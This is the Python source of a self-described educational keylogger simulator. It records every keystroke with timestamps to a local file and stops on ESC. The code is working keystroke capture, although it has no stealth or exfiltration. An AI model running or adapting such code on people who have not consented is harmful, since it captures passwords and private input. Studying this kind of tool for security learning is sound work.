# keylogger_simulator.py
# EDUCATIONAL USE ONLY - Keylogger Simulator for Cybersecurity Learning

import sys
import logging
from pynput import keyboard
import datetime
import os
import threading
import traceback
from pathlib import Path

# Get the script's directory
BASE_DIR = Path(__file__).resolve().parent
log_file = BASE_DIR / "keylog.txt"
log_system = BASE_DIR / "keylogger.log"

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_system),
        logging.StreamHandler(sys.stdout)
    ]
)

log_buffer = []
buffer_lock = threading.Lock()
flush_interval = 1  # Flush buffer to file every 1 second
running = True
_flush_timer = None  # Track the active timer so it can be cancelled

def setup_log_file():
    """Initialize the log file with proper permissions."""
    try:
        if not log_file.exists():
            with open(log_file, "w", encoding="utf-8") as f:
                f.write("=== Keylogger Simulator Log - For Educational Use Only ===\n")
            logging.info(f"Created new log file: {log_file}")
        else:
            logging.info(f"Using existing log file: {log_file}")
    except Exception as e:
        logging.error(f"Failed to setup log file: {str(e)}")
        raise

def flush_buffer():
    """Flush the log buffer to the file periodically."""
    global log_buffer, _flush_timer
    try:
        with buffer_lock:
            if log_buffer:
                with open(log_file, "a", encoding="utf-8") as f:
                    f.writelines(log_buffer)
                log_buffer = []

        if running:
            _flush_timer = threading.Timer(flush_interval, flush_buffer)
            _flush_timer.daemon = True
            _flush_timer.start()
    except Exception as e:
        logging.error(f"Error in flush_buffer: {str(e)}")
        traceback.print_exc()

def format_key(key):
    """Format the key press in a readable way."""
    try:
        if hasattr(key, 'char'):
            if key.char and key.char.isprintable():
                return key.char
            return f"[{key}]"
        return f"[{key}]"
    except Exception:
        return "[UNKNOWN]"
    

def on_press(key):
    try:
        formatted_key = format_key(key)
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
        log_entry = f"{timestamp} - {formatted_key}\n"
        
        with buffer_lock:
            log_buffer.append(log_entry)
        
        # Stop listener on ESC
        if key == keyboard.Key.esc:
            logging.info("ESC pressed - stopping listener")
            return False  # This stops the listener
        
    except Exception as e:
        logging.error(f"Error in on_press: {str(e)}")
        traceback.print_exc()

def cleanup():
    """Cleanup resources before shutdown."""
    global running, _flush_timer
    try:
        running = False
        # Cancel any pending timer before doing the final flush
        if _flush_timer is not None:
            _flush_timer.cancel()
            _flush_timer = None
        # Do a direct final flush (not via the timer-rescheduling flush_buffer)
        with buffer_lock:
            if log_buffer:
                with open(log_file, "a", encoding="utf-8") as f:
                    f.writelines(log_buffer)
        logging.info("Keylogger shutting down cleanly")
    except Exception as e:
        logging.error(f"Error during cleanup: {str(e)}")

def main():
    """Main function to run the keylogger."""
    try:
        setup_log_file()
        logging.info("Starting keylogger simulator")
        flush_buffer()  # Start periodic flushing
        
        with keyboard.Listener(on_press=on_press) as listener:
            logging.info("Keyboard listener started")
            listener.join()
            
    except Exception as e:
        logging.error(f"Critical error in main: {str(e)}")
        traceback.print_exc()

if __name__ == "__main__":
    _started = False
    try:
        _started = True
        main()
    except KeyboardInterrupt:
        logging.info("Received keyboard interrupt")
    except Exception as e:
        logging.error(f"Unhandled exception: {str(e)}")
        traceback.print_exc()
    finally:
        if _started:
            cleanup()
